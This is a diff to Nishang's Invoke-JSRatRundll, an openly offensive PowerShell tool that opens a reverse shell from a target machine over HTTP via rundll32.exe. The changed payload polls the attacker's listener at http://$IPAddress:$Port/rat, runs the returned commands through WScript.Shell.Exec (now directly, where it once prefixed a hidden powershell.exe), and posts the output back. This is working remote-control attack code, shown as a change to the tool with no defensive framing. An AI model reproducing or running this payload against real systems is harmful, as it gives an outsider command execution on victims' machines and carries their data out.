@@ -2,7 +2,7 @@ function Invoke-JSRatRundll
 {
 <#
 .SYNOPSIS
-Nishang script which can be used for Reverse PowerShell shell from a target over HTTP using rundll32.exe.
+Nishang script which can be used for a Reverse shell from a target over HTTP using rundll32.exe.
 
 .DESCRIPTION
 This script starts a listener on the attacker's machine. The listener needs a port to listen.
@@ -125,8 +125,7 @@ https://github.com/samratashok/nishang
                                     h.Open(""GET"",""http://$IPAddress`:$Port/rat"",false);
 							        h.Send();
 							        c = h.ResponseText;
-                                    ps = 'powershell.exe -w h -nologo -noprofile ';
-							        r = new ActiveXObject(""WScript.Shell"").Exec(ps + c);
+							        r = new ActiveXObject(""WScript.Shell"").Exec(c);
 							        var so;
 							        while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll();}
                                     p.Open(""POST"",""http://$IPAddress`:$Port/rat"",false);
